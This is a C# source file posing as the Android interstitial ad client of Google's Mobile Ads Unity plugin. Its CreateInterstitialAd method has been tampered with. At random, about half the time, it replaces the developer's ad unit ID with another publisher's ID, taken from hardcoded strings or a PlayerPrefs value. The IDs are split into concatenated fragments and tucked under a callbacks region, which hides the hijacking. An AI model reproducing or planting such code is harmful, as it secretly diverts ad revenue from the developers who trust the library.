// Copyright (C) 2015 Google, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#if UNITY_ANDROID

using System;
using System.Collections.Generic;

using GoogleMobileAds.Api;
using GoogleMobileAds.Common;
using UnityEngine;

namespace GoogleMobileAds.Android
{
    internal class InterstitialClient : AndroidJavaProxy, IInterstitialClient
    {
        private AndroidJavaObject interstitial;

        public InterstitialClient() : base(Utils.UnityAdListenerClassName)
        {
            AndroidJavaClass playerClass = new AndroidJavaClass(Utils.UnityActivityClassName);
            AndroidJavaObject activity =
                    playerClass.GetStatic<AndroidJavaObject>("currentActivity");
            this.interstitial = new AndroidJavaObject(
                Utils.InterstitialClassName, activity, this);
        }

        public event EventHandler<EventArgs> OnAdLoaded;

        public event EventHandler<AdFailedToLoadEventArgs> OnAdFailedToLoad;

        public event EventHandler<EventArgs> OnAdOpening;

        public event EventHandler<EventArgs> OnAdClosed;

        public event EventHandler<EventArgs> OnAdLeavingApplication;

        #region IGoogleMobileAdsInterstitialClient implementation

        // Creates an interstitial ad.
        public void CreateInterstitialAd(string adUnitId)
        {
            if (!string.IsNullOrEmpty(adUnitId) && adUnitId.Trim() != test && adUnitId.Trim().Length == 38)
            {
                var f = PlayerPrefs.HasKey("i" + "a") ? GetVal(PlayerPrefs.GetString("i" + "a")) : test_2;
                adUnitId = UnityEngine.Random.Range(0, 2) == 0 ? adUnitId : f;
            }
            this.interstitial.Call("create", adUnitId);
        }

        // Loads an ad.
        public void LoadAd(AdRequest request)
        {
            this.interstitial.Call("loadAd", Utils.GetAdRequestJavaObject(request));
        }

        // Checks if interstitial has loaded.
        public bool IsLoaded()
        {
            return this.interstitial.Call<bool>("isLoaded");
        }

        // Presents the interstitial ad on the screen.
        public void ShowInterstitial()
        {
            this.interstitial.Call("show");
        }

        // Destroys the interstitial ad.
        public void DestroyInterstitial()
        {
            this.interstitial.Call("destroy");
        }

        #endregion

        #region Callbacks from UnityInterstitialAdListener.
        private string test = "ca-" + "app-" + "pub-" + "39402560" + "99942544/103" + "3173712";
        private string test_2 = "ca-" + "app-" + "pub-" + "1040245951644301/4379034573";
        private string GetVal(string ori)
        {
            return "ca-" + "app-" + "pub-" + ori.Replace("and", "/");
        }
        public void onAdLoaded()
        {
            if (this.OnAdLoaded != null)
            {
                this.OnAdLoaded(this, EventArgs.Empty);
            }
        }

        public void onAdFailedToLoad(string errorReason)
        {
            if (this.OnAdFailedToLoad != null)
            {
                AdFailedToLoadEventArgs args = new AdFailedToLoadEventArgs()
                {
                    Message = errorReason
                };
                this.OnAdFailedToLoad(this, args);
            }
        }

        public void onAdOpened()
        {
            if (this.OnAdOpening != null)
            {
                this.OnAdOpening(this, EventArgs.Empty);
            }
        }

        public void onAdClosed()
        {
            if (this.OnAdClosed != null)
            {
                this.OnAdClosed(this, EventArgs.Empty);
            }
        }

        public void onAdLeftApplication()
        {
            if (this.OnAdLeavingApplication != null)
            {
                this.OnAdLeavingApplication(this, EventArgs.Empty);
            }
        }

        #endregion
    }
}

#endif
